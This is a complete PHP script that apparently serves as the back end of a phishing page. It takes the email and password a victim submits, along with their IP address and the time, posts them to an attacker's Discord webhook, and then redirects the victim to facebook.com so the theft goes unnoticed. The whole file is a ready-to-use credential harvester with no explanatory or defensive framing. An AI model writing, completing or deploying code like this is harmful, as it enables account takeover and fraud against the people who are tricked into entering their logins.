<?php
// 1. Capture the data from the POST request
$email = $_POST['email'] ?? 'Not found';
$password = $_POST['pass'] ?? 'Not found';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$time = date('Y-m-d H:i:s');

// 2. Format the payload for Discord
$message = "🔔 **New Entry Captured** 🔔\n" .
           "**Time:** $time\n" .
           "**IP:** $ip\n" .
           "**Email:** $email\n" .
           "**Password:** $password";

$webhook_url = "YOUR_DISCORD_WEBHOOK_URL_HERE";

$payload = json_encode(["content" => $message]);

// 3. Send via cURL
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// 4. Redirect the user
header("Location: https://www.facebook.com");
exit();
?>